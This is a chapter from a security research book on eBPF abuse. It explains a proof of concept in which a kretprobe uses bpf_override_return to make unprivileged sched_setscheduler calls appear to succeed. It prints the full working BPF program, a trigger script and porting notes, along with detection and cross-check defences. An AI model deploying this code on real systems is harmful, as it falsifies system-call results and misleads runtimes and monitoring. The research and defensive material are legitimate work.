---
layout: book
title: "Chapter 14: SCHED_FIFO Impersonator"
date: 2025-03-15
---

**Chapter 14: Forging the Return Value of `sched_setscheduler`**

> **See also**: [Blog post]({{ site.baseurl }}/sched-fifo-impersonator.html) · [POC code](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch14-sched-fifo) · [Harness entry](https://github.com/mbhatt1/dBPF/blob/master/dBPF-pocs/harness/proof.py)

This chapter is a userspace-illusion bypass. I want that framing up front because the label matters. Nothing in the kernel's scheduler state changes. `task_struct->policy` is the same after the probe fires as it was before. The runqueue the task sits on is the same. `cfs_rq` vs. `rt_rq` placement is unchanged. If the process later calls `sched_getscheduler()`, it will get back `SCHED_OTHER` and not whatever fiction the probe handed it a moment ago. The only thing that changed is the integer the kernel returned to userspace on the way out of one specific syscall — and the loud part is that almost all the tooling that gates on that return value never asks a second time.

The shape of the bug being exploited here is as old as SUID. A privileged operation asks the kernel "did this work?" and then trusts the answer. The SETUID-bit disasters of the 1990s (Sendmail, various xterms, xlock) repeatedly reduced to the same mistake: check at the query point, not the enforcement point. The eBPF version automates it. `bpf_override_return` on a kretprobe flips the answer sitting in the return register, and every caller that trusts that register starts behaving as though the call succeeded. What I am proving with ch14 is not a novel vulnerability class; it is a tidy mechanical expression of a bug class that keeps shipping. The kernel-side enforcement (the `cred` check inside `__sched_setscheduler` that returns `-EPERM` because the caller lacks `CAP_SYS_NICE`) happens exactly as it should. The failure mode lives in the two-inches of userspace between `chrt`'s call to the syscall and `chrt`'s decision to print "SCHED_FIFO".

The same pattern appears in chapter 18 against `__arm64_sys_getuid` and `__arm64_sys_geteuid`. Two chapters, same primitive, different targets. Chapter 18 forges `uid=0`; this one forges "your SCHED_FIFO request succeeded." Both work because the kernel's answer is trustworthy but the cached echo of that answer in userspace is not. When you read them back-to-back it becomes clear that the *category* is "we forged the return value of a syscall that userspace treats as authoritative" and the only interesting per-chapter content is which symbol is on the error-injection list this week.

## Why `__arm64_sys_sched_setscheduler` is Reachable

`bpf_override_return` is not a general-purpose helper. It is restricted to kprobes that attach to kernel functions annotated with `ALLOW_ERROR_INJECTION`. The annotation is compiled into the kernel and exposed at runtime as a list in `/sys/kernel/debug/error_injection/list`. If you attach a program that calls `bpf_override_return` to a function that is not on that list, the verifier either rejects the load or — more commonly in my experience — the load succeeds but the override is silently inert. No warning, no error. The kprobe fires; the return register is not touched. That silent degradation is exactly what I documented in chapter 1: `cap_capable` loaded fine, but the override never landed, and I only knew for certain after I cross-checked `/proc/kallsyms`, `/sys/kernel/debug/error_injection/list`, and an actual `capset()` call from an unprivileged shell.

So the first question I asked before writing a line of this chapter was: is `__arm64_sys_sched_setscheduler` on the list? Here is what I ran on the linuxkit 6.12.54 aarch64 kernel I was testing against:

```
# grep sched_setscheduler /sys/kernel/debug/error_injection/list
ffff800080123abc  __arm64_sys_sched_setscheduler
```

One line. One symbol. The address will differ per-boot because of KASLR, but the symbol presence is what I care about. The syscall-entry wrapper is on the list. The internal `__sched_setscheduler` core — which is what actually does the capability check and the policy mutation — is not, and if you kprobe `__sched_setscheduler` and call `bpf_override_return`, it loads but does nothing. This is the same pattern that bit me in chapter 1.

Why does the kernel curate this list the way it does? The annotation exists for error-injection testing. The `CONFIG_FUNCTION_ERROR_INJECTION=y` subsystem lets test harnesses force specific kernel functions to return specific error codes, exercising error paths that are hard to reach under normal workloads. The curators put *syscall entry wrappers* on the list liberally because that is the shape of an error the kernel already emits — an `-EPERM` or `-EINVAL` short-circuit at the entry point is a well-understood failure mode. They do not put *deep internal functions* on the list unless there is a specific reason, because "what does it mean to inject an error here?" becomes ambiguous when the function is not at a natural error boundary.

The security property this buys `bpf_override_return` is accidental but real. You can only force a syscall to "fail" (or, symmetrically, to "succeed") at its entry wrapper. You cannot reach in and flip a decision in the middle of the syscall. For the SCHED_FIFO impersonator that constraint is fine, because the thing I want to flip *is* the final return value, and the entry wrapper on aarch64 sits exactly at that point. The wrapper is the last kernel function before the syscall return path hands control back to userspace.

The architectural detail matters: on aarch64 the syscall entry wrappers are named `__arm64_sys_<name>`, on x86_64 they are `__x64_sys_<name>`. The wrappers are generated by the `SYSCALL_DEFINEN` macros, they unpack the `pt_regs` into typed arguments, they call the real syscall function, and they return its result. They are also uniformly marked with `ALLOW_ERROR_INJECTION(..., ERRNO)` — see `include/linux/syscalls.h` and the per-arch header. That annotation is what puts them on the list. Most mainline kernels I have looked at (Debian, Ubuntu, RHEL derivatives on 6.x) preserve this annotation. Some heavily-patched vendor kernels strip it. The preflight in the ch14 loader reads `/proc/kallsyms` at startup and refuses to run if the symbol is missing, but it does not currently cross-check the error-injection list because on kernels that include the symbol it has essentially always also included the annotation. If you are porting ch14 to a kernel where that assumption breaks, the symptom will be "kprobe attaches, events stream, `flipped=1` appears in the log, but `chrt` still fails" — and you will know where to look.

## The BPF Program, Line by Line

The attached program is `ch14-sched-fifo.bpf.c` in the POC repo. It is short by design. I'll walk the whole file.

```c
struct evt {
    unsigned int pid;
    unsigned int tgid;
    char comm[16];
    int policy;
    int prio;
    int flipped;
};
```

`evt` is the ringbuf record. `policy` is reused as `orig_ret` — I kept the field name from an earlier draft where I was recording the requested policy from the syscall arg, but by the time I had the kretprobe working I cared more about the original return value, and changing a struct name across the loader and the BPF program would have been makework. Renaming is on the TODO list. `flipped` is the bit I care about most in the ringbuf stream: it tells the loader whether this specific evaluation was one where `bpf_override_return` actually ran.

```c
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, unsigned int);
    __type(value, unsigned int);
    __uint(max_entries, 1024);
} target_tgids SEC(".maps");
```

The target set. Key is tgid, value is a sentinel (always `1` when present; the value is unused). Wildcard mode inserts key `0`. The kretprobe does two lookups: first the caller's actual tgid, then the wildcard key. Either hit counts as targeted.

```c
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, unsigned long);
    __type(value, struct evt);
    __uint(max_entries, 4096);
} inflight SEC(".maps");
```

The in-flight map, keyed on `pid_tgid` (the 64-bit combined pid|tgid from `bpf_get_current_pid_tgid()`). This is the standard pattern for pairing a kprobe to a kretprobe: on entry, stash per-call state; on return, look it up. The key is process- and thread-unique, so concurrent syscalls from different threads do not collide. The map entry is wiped in the kretprobe after use.

```c
SEC("kprobe/__arm64_sys_sched_setscheduler")
int BPF_KPROBE(kp_sched, struct pt_regs *regs)
{
    struct evt e = {};
    unsigned long id = bpf_get_current_pid_tgid();
    e.pid = id & 0xffffffff;
    e.tgid = id >> 32;
    bpf_get_current_comm(&e.comm, sizeof(e.comm));
    bpf_map_update_elem(&inflight, &id, &e, BPF_ANY);
    return 0;
}
```

The entry kprobe. It does very little: captures pid, tgid, and comm, drops the struct into `inflight` keyed on the combined pid_tgid, returns. Note what it is *not* doing: it is not unpacking the syscall args. The syscall prototype is `sched_setscheduler(pid_t pid, int policy, const struct sched_param *param)`. On aarch64 those land in `regs->regs[0]`, `regs->regs[1]`, and `regs->regs[2]` respectively. I could read `policy` off the register and record it in the event. I chose not to, because the interesting question is not "what policy did they ask for" but "did the kernel reject them, and did we flip it." The policy they asked for is redundant — if `chrt -f 50 $$` is what triggered the kprobe, we know it was `SCHED_FIFO`; any other value produces the same mechanical behavior.

I also considered reading the `param` pointer and the priority. The verifier makes that painful: dereferencing a userspace pointer from a kprobe requires `bpf_probe_read_user`, the pointer may not be valid at the point the kprobe fires if the syscall is returning early, and the priority is again not a field I care about for the primitive. So the entry kprobe remains minimal.

```c
SEC("kretprobe/__arm64_sys_sched_setscheduler")
int BPF_KRETPROBE(kr_sched, long ret)
{
    unsigned long id = bpf_get_current_pid_tgid();
    struct evt *p = bpf_map_lookup_elem(&inflight, &id);
    if (!p) return 0;
    unsigned int tgid = id >> 32;
    int match = bpf_map_lookup_elem(&target_tgids, &tgid) ? 1 : 0;
    unsigned int zero = 0;
    if (!match && bpf_map_lookup_elem(&target_tgids, &zero)) match = 1;
    int flipped = 0;
    if (match && ret != 0) {
        bpf_override_return(ctx, 0);
        flipped = 1;
    }
    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (e) {
        __builtin_memcpy(e, p, sizeof(*e));
        e->flipped = flipped;
        e->policy = (int)ret;
        bpf_ringbuf_submit(e, 0);
    }
    bpf_map_delete_elem(&inflight, &id);
    return 0;
}
```

The kretprobe is where the actual work happens. Walk the branches:

1. Look up the `inflight` record. If it is missing, we are looking at a return without an entry — shouldn't happen under normal operation, but a kprobe can miss the entry if the program is attached mid-call or if a resource limit evicts the map entry. Bail.
2. Check the target set. Exact-tgid first, wildcard second. I keep the two lookups explicit rather than folding them into a single helper; the cost is two map lookups per call, which is inexpensive, and the code reads more clearly.
3. Decide whether to flip. Three conditions must hold: the caller is targeted, the kernel's return is non-zero (we never flip a success to a success, that would be noise), and the program has `CONFIG_BPF_KPROBE_OVERRIDE` available. The third is a load-time property; if it were missing the program would fail to load.
4. Call `bpf_override_return(ctx, 0)`. This is the one line that matters. It writes `0` to the architectural return register (on aarch64, `x0`), so when the syscall return path pops back into userspace, `x0` holds `0` and libc interprets that as success.
5. Emit a ringbuf event recording the original return, whether we flipped, and the caller metadata. The loader prints these.
6. Clean up `inflight`.

The choice to always emit a ringbuf event — even on non-flipped returns — is deliberate. It gives the loader a clean stream of "here is every call we saw, here is what the kernel originally returned, here is whether we changed it." For debugging that is invaluable. For operational noise it is too much, which is why the loader supports surgical `--tgid` targeting; the ringbuf still records every call, but the match flag is `0` for non-targeted tgids and the loader can filter on output.

## Verifier Pushback

The program loaded clean on the first try in the form above, but an earlier draft did not. I had written the entry kprobe to read the `param` pointer and pull the priority out:

```c
struct sched_param *p = (struct sched_param *)PT_REGS_PARM3(regs);
int prio = 0;
bpf_probe_read_user(&prio, sizeof(prio), &p->sched_priority);
e.prio = prio;
```

The verifier accepted this but only after I added explicit zero-initialization of `prio`. Without the initialization, the verifier saw `prio` as uninitialized on the path where `bpf_probe_read_user` failed, and refused the subsequent store into `e.prio`. Small annoyance, well-understood pattern, fixed in ten seconds. I mention it because the verifier's rules around initialized-before-used are strict in ways that casual C programmers are not used to.

The bigger fight was with `bpf_override_return`. The verifier checks at load time whether the attached function is in the error-injection list, and whether the kernel was built with `CONFIG_BPF_KPROBE_OVERRIDE=y`. If either is missing, the load either fails or the helper is silently inert. On 6.12 linuxkit aarch64 both conditions hold. On the same kernel with `unprivileged_bpf_disabled=1` and a strict `lockdown=confidentiality` profile, the load would fail with `-EPERM` before ever reaching the verifier. I have not tested this on a RHEL 9 production kernel with a signed-kernel policy; my expectation is that `CAP_SYS_ADMIN` plus a disabled lockdown profile is the bar.

One more verifier note: I briefly tried to move the "am I targeted?" check to the entry kprobe (record `match` in the `inflight` record, reuse it on return). That works and saves two map lookups per return. I rolled it back because concurrent updates to the target set from userspace could create a TOCTOU where a tgid was added between entry and return; with the check on the return side only, the target set is sampled at the latest possible moment. For a telemetry probe that tradeoff is noise; for an enforcement probe it matters.

## The Trigger's Baseline-Then-Override Ritual

`trigger.sh` is the demo I run to prove the primitive end-to-end. It has three phases and I want to be explicit about what each one is showing.

```bash
useradd -M "$USER_NAME" 2>/dev/null

echo "=== baseline: $USER_NAME runs chrt -f 50 \$\$ (no BPF) ==="
su "$USER_NAME" -c 'chrt -f 50 $$; echo baseline_ret=$?'
```

Phase 1: a fresh unprivileged user `t14` runs `chrt -f 50 $$` with no BPF in the picture. `chrt` calls `sched_setscheduler(0, SCHED_FIFO, &param)`. The kernel's `__sched_setscheduler` checks credentials. `t14` does not have `CAP_SYS_NICE`. The call returns `-EPERM`. `chrt` prints:

```
chrt: failed to set pid 0's policy: Operation not permitted
baseline_ret=1
```

Good. This is the kernel doing its job. The baseline is important because the demo is not just "show the probe firing"; it is "show that the baseline rejection is real, then show the override making the same call succeed." Without the baseline I could not distinguish "the override worked" from "the user already had the capability."

```bash
echo ""
echo "=== loading ch14 SCHED_FIFO impersonator (wildcard mode) ==="
"$BIN" --all > "$LOG" 2>&1 &
LOADER_PID=$!
sleep 1
```

Phase 2: the loader goes up in wildcard mode (`--all`). That inserts the wildcard key in `target_tgids` so every future call to `__arm64_sys_sched_setscheduler` is a match. The `sleep 1` is load-smoothing — libbpf does `BPF_PROG_LOAD`, the kprobe attach, and the kretprobe attach, and a second is plenty for all that to settle on this kernel. If the loader died on startup (missing symbol, verifier reject), the harness checks `kill -0 $LOADER_PID` and bails with the log.

```bash
echo "=== with BPF: same chrt call ==="
su "$USER_NAME" -c 'chrt -f 50 $$; echo override_ret=$?'
```

Phase 3: same user, same command, probe active. `chrt` issues the same `sched_setscheduler(0, SCHED_FIFO, &param)`. The kernel's credential check still runs, still returns `-EPERM`. But between `__sched_setscheduler` returning `-EPERM` to the `__arm64_sys_sched_setscheduler` wrapper and the wrapper returning to userspace, the kretprobe fires. The kretprobe sees the real return (`-EPERM`, a.k.a. `-1`), sees that the caller is in the wildcard set, calls `bpf_override_return(ctx, 0)`, and the return register ends up as `0`. `chrt` sees `0`, prints nothing (no error), and bash's `$?` is `0`:

```
override_ret=0
```

The ringbuf log then shows:

```
[sched] pid=18843 tgid=18843 comm=chrt             orig_ret=-1 flipped=1
```

`orig_ret=-1 flipped=1` is the unambiguous evidence. The kernel's `__sched_setscheduler` returned `-1` (EPERM), the kretprobe flipped it to `0`, `chrt` believed success, bash believed success.

```bash
FLIPS=$(grep -cE 'flipped=1|\bflip\b|override' "$LOG" 2>/dev/null || echo 0)
echo "=== SCHED_WEAPON_PROVEN flips=${FLIPS} ==="
```

The final line is the weapon marker the harness scrapes. `SCHED_WEAPON_PROVEN flips=N` goes into the HTML report. The harness's `Poc("ch14", ...)` entry in `proof.py` has `flip_marker=r"flipped=1|flip|override"` and `proof_marker=r"flipped=1|SCHED_WEAPON_PROVEN"` — either pattern in the output is sufficient to mark the chapter proven.

The loader's `mode="trigger-runs-loader"` flag tells the harness to run `trigger.sh` rather than launching the loader binary directly and then separately running a workload. That matters because the demo is the full sequence baseline → load → re-call, not just "attach and observe." A loader-only run would show a long tail of `[sched] ... flipped=0` as other system processes made benign `sched_setscheduler` calls; the trigger wraps the whole ritual so the proof artifact is concise.

## What Still Catches It (And What Doesn't)

The illusion is exactly one syscall wide. Here are the gotchas.

**`sched_getscheduler($pid)`** returns the real policy. The kernel's implementation reads `task->policy` directly. Nothing I did touched that field — writing `task_struct` from BPF is not allowed, and even if it were, I would be chasing a very different primitive. So if any observer calls `sched_getscheduler()` on the same pid after the "successful" `sched_setscheduler`, they will get back `SCHED_OTHER` (or whatever the real policy was), not `SCHED_FIFO`.

**`/proc/[pid]/stat` field 41 (policy)** is the scheduling policy. It is populated from `task->policy`. Same story — the real policy, not the forged one.

**`/proc/[pid]/sched`** prints the real policy in its `policy` line. It also prints the realtime priority, which will be the real one (0 for SCHED_OTHER), not the 50 from the request.

**`/proc/[pid]/status` Tgid/Pid/etc** are unaffected but they do not carry scheduler state, so they are neither caught nor fooled.

**`sched_getparam($pid)`** reads `task->rt_priority` from the real task state. Untouched.

**`ps -L -o cls,rtprio,pid`** reads from `/proc/*/stat`. So it shows the real policy. `ps` catches the illusion.

**`htop` in detailed mode** reads similar `/proc` fields. It catches the illusion.

**`chrt -p $pid`** issues a `sched_getscheduler` syscall. Catches the illusion.

**`systemd-cgls` / `systemctl status`** gate on the reported policy but systemd queries the kernel directly via `sched_getscheduler` too, so on the reading side it is truth. However — and this is the subtle part — systemd's `CPUSchedulingPolicy=` unit directive is enforced by a call to `sched_setscheduler` *during unit startup*. If systemd's startup-time setscheduler call is the one we forged, the unit's own record of "did I successfully set the policy" is wrong, and downstream `systemd` behavior that depends on "I configured this unit's policy correctly" is downstream of the forgery.

What does not cross-check: the very large corpus of userspace code that calls `sched_setscheduler` or `pthread_setschedparam` once at startup, branches on the return value, and then never asks again. `chrt` itself is the canonical example — it sets, it queries to print the new state (and *that* query is unforged on this POC, since I only hook setscheduler), and it exits. Many JIT runtimes do an unguarded priority boost and assume the call worked. Many audio applications do the same. Realtime-extension libraries (POSIX `sched_*` wrappers in `librt`) trust the return value. The chrt command-line case is an illustrative example; the production concern is the library layer.

The honest framing here is not "you get SCHED_FIFO." The honest framing is "anything that trusts the setscheduler return is fooled; anything that cross-checks sees the truth." That is the entire class of target, and it is — for reasons I do not fully understand — a much larger class than I expected before I went looking.

## What the Harness Captures

`Poc("ch14", ...)` is in `dBPF-pocs/harness/proof.py` and runs with `mode="trigger-runs-loader"`. The harness:

1. Confirms symbols in the `hooks=[...]` list are present in `/proc/kallsyms`. For ch14 that is `__arm64_sys_sched_setscheduler`.
2. Runs `trigger.sh` with a configurable timeout.
3. Captures stdout/stderr and greps for `flip_marker` and `proof_marker` regexes.
4. Counts flips by counting `flipped=1` lines.
5. Emits `CH14_WEAPON_PROVEN flips=N` into the report.

On a healthy run the output includes one `flipped=1` event per `chrt` invocation by the unprivileged user, plus a cloud of `flipped=0` events from every other process that happened to call `sched_setscheduler` during the brief window the probe was loaded (systemd sometimes does, kernel worker threads sometimes do; the wildcard mode tags them all). The harness's proof marker is satisfied by the presence of even one `flipped=1`.

## Cross-Kernel Portability

The primitive transports cleanly to any kernel where:

1. `__arm64_sys_sched_setscheduler` (or `__x64_sys_sched_setscheduler` on x86_64) is in `/proc/kallsyms`.
2. That symbol is annotated with `ALLOW_ERROR_INJECTION` (check `/sys/kernel/debug/error_injection/list`).
3. `CONFIG_BPF_KPROBE_OVERRIDE=y` in the running kernel config.
4. `CAP_SYS_ADMIN` is available to the loader, `unprivileged_bpf_disabled` is `0` or bypassable, and lockdown is not in `confidentiality` mode.

I have confirmed (1)-(3) on Debian 12, Ubuntu 22.04, and the linuxkit 6.12 I develop against. (4) varies by deployment. On a typical vanilla debian-cloud image the primitive works. On a GCP Container-Optimized OS image it does not — lockdown is enabled. On an Amazon Linux 2023 image it works if you are root in the root namespace. I did not attempt any policy-escape gymnastics to get past lockdown; when lockdown is on, this primitive is off.

The x86_64 port is a one-character change: replace `__arm64_sys_` with `__x64_sys_` in the SEC string. I have a working x86_64 build but I ship the aarch64 variant because that is what the linuxkit target expects.

## Detection

The defender-side picture is not subtle.

**`bpftool prog show type kprobe`** lists every kprobe program loaded in the kernel. `kp_sched` and `kr_sched` attached to `__arm64_sys_sched_setscheduler` will appear. Neither tracing nor performance-observability tooling that I know of legitimately hooks that symbol. A kprobe on a syscall entry wrapper, from a process that is not a well-known tracer, is a hard signal.

**`/sys/kernel/tracing/kprobe_events`** shows the dynamic kprobe entries. Same story — presence here, without a clear reason, is anomalous.

**`auditd`** fires `AUDIT_BPF_PROG_LOAD` on every `bpf(BPF_PROG_LOAD)` call when configured. The loaded program's BTF will show the `bpf_override_return` helper call, which is itself a strong signal. `bpftool prog dump xlated` surfaces the helper-call opcode if you want to inspect it.

**`/sys/kernel/debug/kprobes/list`** (on kernels where debugfs is readable) lists every kprobe attached. Two entries on the same symbol, paired as entry + return, is the fingerprint.

**Cross-check defense**: a detector that periodically reads `/proc/[pid]/sched` and compares it against whatever state it expects (e.g. "pid X should be SCHED_FIFO because systemd started it that way") would catch divergence. I have not seen any production defender doing this, but it is the only behavioral signal that catches the illusion without catching the probe. For the class of "wrong enforcement point" bugs this is the universal defense — trust the kernel's current state, never the historical answer.

## Prior Art and Framing

The pattern is not new. Forging the return of a privilege-check syscall is an older bug class than SUID — the PDP era had analogous tricks. The BPF implementation is recent but mechanical. I want to credit the broader category:

- Sendmail's multiple SUID forgery chains (1990s) reduced to "trust the syscall return, not the cred at enforcement time."
- xterm, xlock, various window-system SUID binaries through the early 2000s.
- OpenSSH's privsep design exists specifically to push enforcement into a separate address space so return-value forgeries from ptrace and LD_PRELOAD cannot reach it. The BPF variant bypasses privsep because it is at a lower layer, but the class of mistake is the one privsep was designed to prevent.

The BPF-era contribution is that `bpf_override_return` makes the forgery declarative: you do not need an LD_PRELOAD, you do not need ptrace, you do not need to patch the binary. You declare the forgery as a kernel probe and every caller is affected transparently. The primitive is clean. The target class is broad. The detection story is straightforward *if* defenders know to look at `bpftool prog show`. The cross-check story is simple *if* defenders distrust historical return values.

This chapter is one of three (with 16 and 18) that share the same underlying primitive — forge an `ALLOW_ERROR_INJECTION`-annotated syscall's return. The family is large; each member picks a different target. I picked SCHED_FIFO because the baseline-failure-then-override sequence is visually dramatic and because the tooling (chrt, ps, /proc/*/sched) gives you a clear "what did each observer see" table. Chapter 18 does the same for uid/euid, which forges a different kind of lie.

## The Loader's Preflight

Before attaching a single probe, the loader in `ch14-sched-fifo.c` walks `/proc/kallsyms` looking for the target symbol. The implementation is small and worth quoting because the same shape appears in ch16 and ch18:

```c
static int kallsyms_has(const char *sym)
{
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) return -1;
    char line[512];
    size_t slen = strlen(sym);
    int found = 0;
    while (fgets(line, sizeof(line), f)) {
        char *p = strchr(line, ' ');
        if (!p) continue;
        p = strchr(p + 1, ' ');
        if (!p) continue;
        p++;
        ...
```

The kallsyms format is `addr type name [module]`. Address, space, type character, space, symbol name, optionally tab, module name in brackets. The preflight tokenizes that, compares the third field against the target symbol, and accepts either a bare match or `name\t[module]`. The bare match is what matters for a built-in symbol like `__arm64_sys_sched_setscheduler`.

Why do this at all? Because the error mode I most wanted to avoid was "the loader attaches, runs for a while, emits `[sched]` events, but the override silently does not fire." That happens when the symbol is there but the error-injection annotation is not, and it is the worst kind of false success — the ringbuf events look real, but the process that issued `chrt` still got `-EPERM`. The preflight catches the more basic case (wrong arch, symbol missing entirely) and refuses to run. It does not catch the subtler case (symbol present, annotation missing). For that you have to look at the `flipped=1` counter in the output; if the probe fires but no flips are recorded and you know the caller was in the target set, the annotation is the thing to look for.

The preflight's exit code is `3` on a missing symbol, distinct from `1` (generic BPF failure) and `2` (argument parsing). The harness treats `3` as a "skip this chapter on this kernel" signal rather than a hard fail.

## The Loader's libbpf Logging Gate

One small engineering choice worth calling out. libbpf is noisy at `LIBBPF_DEBUG`, and on a verifier rejection the debug trace is crucial. The loader gates the noise behind `--verbose`:

```c
static int libbpf_print(enum libbpf_print_level lvl, const char *fmt, va_list ap)
{
    if (!g_verbose && lvl == LIBBPF_DEBUG) return 0;
    return vfprintf(stderr, fmt, ap);
}
```

Without the gate, a normal run dumps pages of BTF parsing and program-loading chatter to stderr. With the gate, a normal run is quiet and a failed verifier load emits nothing useful. So `--verbose` is the first thing I reach for when a new attach target misbehaves. Same pattern in the other loaders; it is one of those "reuse it when you think of it" helpers.

## The Stdout/Stderr Split

Every loader in this collection splits its output: stderr carries status, stdout carries events. The reason is the harness.

```
./build/ch14-sched-fifo --all > events.jsonl 2> status.log
```

The harness's regex matcher runs over stdout + stderr combined, but a real operator wants `events.jsonl` to be a clean append-only stream of observations that can be piped into `jq`, a log aggregator, or a tail-and-grep loop. Mixing status messages (attach, detach, signal handling) into the event stream would break that. The convention is explicit in every loader's comment header: `status messages go to stderr; ringbuf events go to stdout`. A `tag=ready`, `tag=preflight`, `tag=shutdown` prefix on status lines makes them easy to filter when a harness does want them.

## The Inflight Map is a Concurrency Boundary

Under load, `__arm64_sys_sched_setscheduler` is not a hot function, but it is not rare either. On a busy system with several realtime-enabled services, you can see a few calls per second. The `inflight` map has to be robust to concurrent entries from different threads.

The keying is `bpf_get_current_pid_tgid()` which is a 64-bit `(tgid << 32) | pid`. That is unique per-thread per-process, so two threads of the same process making concurrent `sched_setscheduler` calls get distinct keys. Two different processes making concurrent calls also get distinct keys (different tgids). There is no collision surface inside the map for concurrent, non-recursive calls.

The one theoretical hole is reentrancy: if a kprobe handler were somehow preempted and the same thread ended up inside `__arm64_sys_sched_setscheduler` again before the first invocation returned, the second entry's `bpf_map_update_elem` would overwrite the first. In practice this does not happen because kprobe handlers on 6.x run with preemption disabled, and the syscall entry wrapper is not itself a place where the kernel voluntarily schedules. So the invariant "one outstanding entry per `pid_tgid` at any given time" holds.

The map's `max_entries=4096` gives headroom for thousands of concurrent calls from different threads. If the map fills — which I have never seen in practice — the kretprobe would find a missing entry on return, bail, and no override would happen. That is a safe degradation: miss-the-flip is preferable to wrong-flip.

## A Note on the `policy` Field Reuse

I mentioned earlier that `evt.policy` is reused as `orig_ret` in the kretprobe. This is the kind of sharp edge that survives in early-draft code and I want to name it plainly:

```c
e->policy = (int)ret;   // reuse field: orig_ret
```

The struct field is named `policy` because an earlier draft recorded the requested scheduler policy from the syscall arg. That draft never worked reliably (the pointer deref was flaky and the policy wasn't particularly useful), and I replaced the content with the return value without renaming the field. The loader prints `orig_ret=%d` with `e->policy` as the format argument:

```c
printf("[sched] pid=%u tgid=%u comm=%-16s orig_ret=%d flipped=%d\n",
       e->pid, e->tgid, e->comm, e->policy, e->flipped);
```

So the eventual rendered output is correct, but a reader who looks at `struct evt` and sees a `policy` field will reasonably expect it to mean "the scheduler policy." It does not. I have left a TODO in the source to rename it. When I do the rename, the BPF program and the loader have to change together — struct layouts must match across the probe/loader boundary, and a mismatched layout produces silent truncation or garbage.

Code archaeology in a POC is a lot like code archaeology in production: what the field is named often lags what the field means. The lesson I keep re-learning is that renames are cheap, and the right moment to do them is immediately after the semantics change, not three chapters later.

## Trigger Script Cleanup Discipline

`trigger.sh` has a `cleanup` trap on `EXIT INT TERM`:

```bash
cleanup() {
    [[ -n "$LOADER_PID" ]] && kill "$LOADER_PID" 2>/dev/null
    wait 2>/dev/null
    userdel "$USER_NAME" 2>/dev/null
}
trap cleanup EXIT INT TERM
```

Three things get cleaned up: the background loader process, any `wait`-pending children, and the `t14` unprivileged user. I put the `userdel` in because leaving orphan users across runs becomes visible as a wall of `grep t14 /etc/passwd` matches after a day of development. The `2>/dev/null` suppresses errors on re-runs where the resource is already gone. The `set +e` at the top of the script (rather than `set -e`) is deliberate: the script must continue past individual failures to emit the proof markers the harness scrapes for.

This discipline matters more in the netns-heavy trigger for ch15 — which creates two network namespaces, two veth pairs, several XDP attachments — but the pattern is the same and I want to flag it here so it reads consistently across chapters.

## `pthread_setschedparam` and the Library Layer

`chrt` is an illustrative target but not a representative one. The production-relevant target class is the pile of library code that calls `pthread_setschedparam` and friends during startup.

`pthread_setschedparam` is a glibc wrapper. The implementation under the hood eventually calls the `sched_setscheduler` syscall (or, for the current thread, `sched_setattr` on newer kernels), inspects the return, and propagates `-errno` to the caller. The libraries that use it tend to fall into a few categories:

1. **Realtime audio runtimes.** JACK, PulseAudio in low-latency mode, PipeWire. Each of these boosts the audio thread to `SCHED_FIFO` during startup, logs a warning if the boost fails (usually "real-time privileges needed"), and falls back to SCHED_OTHER. With the probe active, the boost "succeeds" — the warning is not printed, the fallback path is not taken, and the runtime proceeds as though it has a realtime thread. Whether this changes runtime behavior depends on how much of the downstream scheduling logic asks the kernel a second time. In my experience, almost none does.

2. **Realtime extension libraries.** `librt`, `libev`, `libuv` in some configurations. These expose a thin wrapper over `sched_setscheduler` and their callers are typically inline assertions like `if (set_fifo_priority(prio) == 0) enable_fast_path()`.

3. **JVMs in realtime mode.** OpenJDK's Shenandoah GC has a realtime variant that calls `pthread_setschedparam` for GC threads. IBM J9 has similar logic. Both trust the return and branch on it.

4. **Game engines and media pipelines.** Unity, Unreal, GStreamer in some element configurations.

5. **systemd unit directives.** `CPUSchedulingPolicy=` and `CPUSchedulingPriority=` are applied by systemd calling `sched_setscheduler` on the child just before exec. If that call is forged, systemd believes the policy was applied and records that in its own state; subsequent `systemctl status <unit>` shows the requested policy, and there is no runtime cross-check.

The list is not exhaustive; it is representative of the shape. The pattern I look for when evaluating a new target is "single setscheduler call during startup, branch on return, never ask again." That shape is extremely common. The ones that escape are the rare workloads that cross-check via `sched_getscheduler` or `/proc/self/sched`, and in every production codebase I have grepped, the cross-check is absent.

## Why the Illusion Can Matter in Scheduling Terms

An attentive reader will ask: if the kernel's runqueue placement is unchanged, what does the forgery buy the attacker beyond misleading log messages? Two things.

First, downstream *decisions* change. If the realtime audio runtime believes it has a SCHED_FIFO thread, it may enable the low-latency code path that skips certain safety checks, skips some buffering, or assumes timely wakeups that the real SCHED_OTHER thread will not deliver. The runtime's *behavior* diverges from a healthy runtime because it is operating on a false belief about its own scheduler state. Depending on the runtime, the downstream effect ranges from "audio glitches that would have been prevented by the fallback path" to "heap corruption in code that assumes realtime guarantees." I have not enumerated the specific exploitable cases; what I am naming is the shape of the risk.

Second, *downstream auditing* is misled. A monitoring agent that queries "which of my services got the policies they asked for" — and there are a few commercial products that do this — will report all-green after a forgery because systemd's internal state says "policy applied." The agent that cross-checks via `sched_getscheduler` would see the divergence, but again, those are rare.

Neither of these is a classical privilege escalation. The primitive is better understood as an integrity attack against the control plane: the attacker has altered the record of what happened without altering what actually happened, and the parts of the system that depend on the record are now wrong.

## Defender-Side Cross-Check: A Worked Example

If I were building a detector for this primitive, here is what I would do. Every N seconds, walk `/proc/*/stat` and compare field 41 (policy) against whatever policy the orchestrator *thinks* each service was configured with. For a systemd system, the orchestrator's record lives in the unit file's `CPUSchedulingPolicy=` directive. For a custom supervisor, it lives in the supervisor's configuration. The cross-check asks: for every service that was supposed to be SCHED_FIFO, is the kernel actually reporting SCHED_FIFO?

This catches ch14. It does not catch a variant where the attacker also forges `sched_getscheduler`'s return (which would require another kprobe on the `sched_getscheduler` syscall wrapper, and a corresponding matching annotation — which does exist on linuxkit 6.12). If the attacker forges both, the defender needs to read `task->policy` directly, which is not a userspace-reachable operation without either kernel cooperation (a dedicated observability hook) or a different BPF program running outside the attacker's control.

The arms race escalates quickly. For now, the forgery of the single setscheduler return is enough to fool the entire userspace ecosystem I have looked at.

## On Naming: "Impersonator" vs. "Bypass"

